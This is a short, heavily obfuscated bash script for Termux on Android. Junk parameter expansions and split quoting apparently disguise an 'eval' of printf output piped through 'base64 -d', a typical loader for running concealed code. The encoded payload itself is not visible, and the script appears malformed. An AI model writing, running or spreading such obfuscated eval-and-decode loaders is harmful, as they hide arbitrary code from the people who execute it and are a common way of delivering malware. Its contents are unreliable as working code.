#!/data/data/com.termux/files/usr/xbin/bash
 "${@/I67fnq2/hw1gSuu}"  'e'v""'a'l "$(  ${*} ''"${@%%|~IyGFtr}"pr""'i'''\n"${@~}"tf   ""  ${*#Gg_$<?k}   |   "${@,}"   ${@~}  $'\142'\a$'\x73'\e$[ ((3#11-6${@#>Ze>}1#0)+41#2)  ]$[ (-(-(-11"${@~}"#2+4#${@/.uptuQ}12)+16#${@/f\[,L}0))  ] -d ${*^}  ${*~}    )"  "${@~}"   